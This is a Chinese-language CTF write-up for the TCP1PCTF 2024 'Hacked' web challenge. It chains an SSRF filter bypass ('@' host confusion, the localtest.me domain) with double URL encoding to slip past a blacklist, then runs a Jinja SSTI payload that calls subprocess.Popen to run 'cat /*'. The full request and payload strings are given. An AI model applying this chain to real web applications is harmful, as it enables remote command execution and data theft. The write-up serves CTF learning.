---
title: "TCP1PCTF 2024 Web Hacked 单题wp"
date: 2024-10-12 19:37
updated: 2024-10-12 19:37
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "Python"
description: "后来没时间看Hacked v2了（悲） 先看配置文件 # Use the official Python image as the base image FROM python:3.8-slim # Set environment variables for Flask ENV PYTHONDONT"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18461268"
---
后来没时间看Hacked v2了（悲）

先看配置文件

```
# Use the official Python image as the base image
FROM python:3.8-slim

# Set environment variables for Flask
ENV PYTHONDONTWRITEBYTECODE 1
ENV PYTHONUNBUFFERED 1

# Set the working directory in the container
WORKDIR /app

# Copy the requirements file and install dependencies
COPY requirements.txt /app/
RUN pip install --no-cache-dir -r requirements.txt

# Copy and move flag
COPY flag.txt /app/
RUN mv flag.txt /$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1).txt

# Copy source code
COPY application /app/

# Expose the port that the app will run on
EXPOSE 1337

# Start the Flask application
CMD ["python", "app.py"]
```

注意到flag在根目录中的一个文件名随机的文件里

看附件app.py

```
from flask import Flask, request, Response, jsonify, redirect, url_for, render_template_string, abort
from util import is_from_localhost, proxy_req
import random, os

app = Flask(__name__)

# I BLACKLIST EVERY CHAR :)

blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]

from flask import request, abort

def check_forbidden_input(func):
    def wrapper(*args, **kwargs):
        for header, value in request.headers.items():
            for forbidden_str in blacklist:
                if forbidden_str in value:
                    abort(400, f"Forbidden: '{forbidden_str}' not allowed in {header} header")

        for key, value in request.args.items():
            for forbidden_str in blacklist:
                if forbidden_str in value:
                    abort(400, f"Forbidden: '{forbidden_str}' not allowed in URL parameter '{key}'")

        try:
            if request.is_json:
                json_data = request.get_json()
                if json_data:
                    for key, value in json_data.items():
                        for forbidden_str in blacklist:
                            if forbidden_str in value:
                                abort(400, f"Forbidden: '{forbidden_str}' not allowed in JSON request body key '{key}'")
            else:
                body = request.get_data(as_text=True)
                for forbidden_str in blacklist:
                    if forbidden_str in body:
                        abort(400, f"Forbidden: '{forbidden_str}' not allowed in request body")
        except Exception as e:
            pass

        # Call the original function if checks pass
        return func(*args, **kwargs)
    return wrapper

@app.route('/', methods=['GET'])
@check_forbidden_input
def proxy():
    url = request.args.get('url')

    list_endpoints = [
        '/about/',
        '/portfolio/',
    ]

    if not url:
        endpoint = random.choice(list_endpoints)
        # Construct the URL with query parameter
        return redirect(f'/?url={endpoint}')
    
    target_url = "http://daffa.info" + url

    if target_url.startswith("http://daffa.info") and any(target_url.endswith(endpoint) for endpoint in list_endpoints):
        response, headers = proxy_req(target_url)

        return Response(response.content, response.status_code, headers.items())
    else:
        abort(403)

@app.route('/secret', methods=['GET', 'POST'])
@is_from_localhost
def dev_secret():
    admin = "daffainfo"
    css_url = url_for('static', filename='css/main.css')

    if request.args.get('admin') is not None:
        admin = request.args.get('admin')

    if not admin:
        abort(403)

    template = '''<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin Notes Preview</title>
            <link rel="stylesheet" href="{}">
        </head>
        <body>
            <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
            <form action="" method="GET">
                <label for="admin">Admin:</label>
                <input type="text" id="admin" name="admin" required>
                <br>
                <input type="submit" value="Preview!">
            </form>
            <p>Admin: {}<span id="adminName"></span></p>
        </body>
        </html>'''.format(css_url, admin)
    return render_template_string(template)

app.run(host='0.0.0.0', port=1337)
```

utils.py

```
from flask import request, abort
import functools, requests
from urllib.parse import urlparse

RESTRICTED_URLS = ['localhost', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

def is_safe_url(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    if not hostname:
        return False
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in hostname:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

def proxy_req(url):
    method = request.method
    headers = {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False,
        allow_redirects=False  # Prevent following redirects
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```

浅读了一下代码。/secret中的SSTI sink很明显

```
    template = '''<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin Notes Preview</title>
            <link rel="stylesheet" href="{}">
        </head>
        <body>
            <h1>NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!</h1>
            <form action="" method="GET">
                <label for="admin">Admin:</label>
                <input type="text" id="admin" name="admin" required>
                <br>
                <input type="submit" value="Preview!">
            </form>
            <p>Admin: {}<span id="adminName"></span></p>
        </body>
        </html>'''.format(css_url, admin)
  return render_template_string(template)
```

看到经典SSTI连招：format字符串加render\_template\_string，可以确诊是jinja SSTI了

但是注意到/secret路由有一个is\_from\_localhost的检测。

```
def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip
```

看了一下绕不了，只能靠SSRF打进来

先打通SSRF，在通过传admin参数打SSTI

## SSRF

注意到根路由有个很明显的功能可以实现SSRF————访问用户传入的URL。过滤要求：

-   通过check\_forbidden\_input检测（黑名单）
-   在URL前面加http://daffa.info
-   URL以list\_endpoints中的元素之一结束
-   通过is\_safe\_url检测（黑名单）
-   禁止重定向（allow\_redirects=False）

一个一个来。

### 通过check\_forbidden\_input检测

首先要通过check\_forbidden\_input检测，这里可以把http包精简一下，把黑名单上的不必要的参数去掉。

黑名单：

```
blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]
```

http包如下：

```
GET / HTTP/1.1
Host:ctf.tcp1p.team:10012
Accept-Language:zh-CN,zh;q=0.9
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0
Connection:keep-alive
```

只留下这几个必要的（或不会触发过滤的）http头。这样就可以访问根目录了。

### 在URL前面加http://daffa.info

注意到没有过滤@。在URL解析里有http://xxx.xx@yyy.yy会解析到yyy.yy去（经典CSRF常用性质）

```
GET /?url=@127.0.0.1:1337/secret?admin={{SSTI PAYLOAD}} HTTP/1.1
Host:ctf.tcp1p.team:10012
Accept-Language:zh-CN,zh;q=0.9
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0
Connection:keep-alive
```

### URL以list\_endpoints中的元素之一结束

这个其实完全不影响。因为我们最后的目标是SSTI。SSTI时}后面多了字符完全没问题。我们可以把/about/放在SSTIpayload后面

```
GET /?url=@127.0.0.1:1337/secret?admin={{SSTI PAYLOAD}}/about/ HTTP/1.1
Host:ctf.tcp1p.team:10012
Accept-Language:zh-CN,zh;q=0.9
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0
Connection:keep-alive
```

即使不是SSTI，我们也可以新开一个GET参数，把/about/放在最后就行。

```
GET /?url=@127.0.0.1:1337/secret?admin={{SSTI PAYLOAD}}%26nevergonnagiveuup=/about/ HTTP/1.1
Host:ctf.tcp1p.team:10012
Accept-Language:zh-CN,zh;q=0.9
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0
Connection:keep-alive
```

### 通过is\_safe\_url检测（黑名单）

```
RESTRICTED_URLS = ['localhost', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
```

URL中不包含RESTRICTED\_URLS中的字符即可。

这里我们的127.0.0.1肯定是G了。::1也不太行，\[::\]啥的也不行（中括号在check\_forbidden\_input被禁）。

然而`.`还在。有一个比较冷门的SSRF绕过方法是用域名解析。有一个很神奇的域名`www.localtest.me`会永远解析到127.0.0.1（不信你自己ping一下）

所以我们可以用`www.localtest.me`代替127.0.0.1

```
GET /?url=@www.localtest.me:1337/secret?admin={{SSTI PAYLOAD}}/about/ HTTP/1.1
Host:ctf.tcp1p.team:10012
Accept-Language:zh-CN,zh;q=0.9
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0
Connection:keep-alive
```

到这里我们的SSRF就打通了

## SSTI

SSTI是很困难的。这里受到check\_forbidden\_input的限制完全打不了。如果有人用纯SSTI打通了请把payload发给我收徒（））。

我试了半天没打通SSTI。过滤太严格了。**我估计预期解应该是直接SSTI**。不然不会给你留`{`，`}`和小括号（SSTI必需部件）（过滤`{{`可以用`{%`）

这里\_没了，但没有限制request，反而把args，form这些东西限制了。只能用request.json传，但是呢json传参又要content-type头是application/json，有application，又被限制。。。总之是打SSTI打红温了。

（睡了一觉起来刷牙的时候突然想到可以用URL双重编码，去学校的路上觉得好像有点道理。在学校越想越觉得我tm是个天才（））回来一试果然通了。）

### URL双重编码绕过

为什么可以用这个呢？你看，既然这个URL是经过两次解析的（SSRF前后），必然会解两次URL码。而那个极其严苛的过滤check\_forbidden\_input是在SSRF前的那一次，SSRF后的SSTI部分反而没有任何过滤。**也就是说，我们的合法输入在过滤之后，还有一次用URL编码改变自己的机会。**这时候，我们就可以用URL二次编码了。

%的URL编码为%25。假设我们要传入`{`就可以用%257b，经过第一层解码变成%7b（%25变成%）第二次解码变成`{`。而第一次解码结束后，传递到过滤函数的是%7b，不是`{`，就不会触发waf

假设我们传入：

```
/?url=%40www.localtest.me:1337/secret?admin=%257b%2525%2570%2572%2569%256e%2574%2528%2528%2529%252e%255f%255f%2563%256c%2561%2573%2573%255f%255f%2529%2525%257d%26aaa=/about/
```

经过第一次解析，变成

```
/?url=@www.localtest.me:1337/secret?admin=%7b%25%70%72%69%6e%74%28%28%29%2e%5f%5f%63%6c%61%73%73%5f%5f%29%25%7d&aaa=/about/
```

这时候绕过check\_forbidden\_input，传入SSTI时再解一次URL编码。admin参数就变成了`{%print(().__class__)%}`就可以正常SSTI了。

![](/images/migrated/18461268/01.png)

只能说出题人没想到这里（）））发现了这个之后我的SSTI之路一马平川）

先找可以用的类

![](/images/migrated/18461268/02.png)

扔到脚本里跑，跑出来这几个索引

```
80: _frozen_importlib._ModuleLock
81: _frozen_importlib._DummyModuleLock
82: _frozen_importlib._ModuleLockManager
82: _frozen_importlib._ModuleLockManager
83: _frozen_importlib.ModuleSpec
133: os._wrap_close
222: warnings.catch_warnings
351: subprocess.Popen
```

然后就随便打了，甚至不用管flag文件名。

```
{%print([].__class__.__base__.__subclasses__()[351]('cat /*',shell=True,stdout=-1).communicate()[0].strip())%}
```

URL编码两次出

![](/images/migrated/18461268/03.png)

**TCP1P{Ch41n1ng\_SsRF\_pLu5\_5St1\_ba83f3ff121ba83f3ff121}**

包非预期的。还是希望直接SSTI出的硬核大佬别喷。
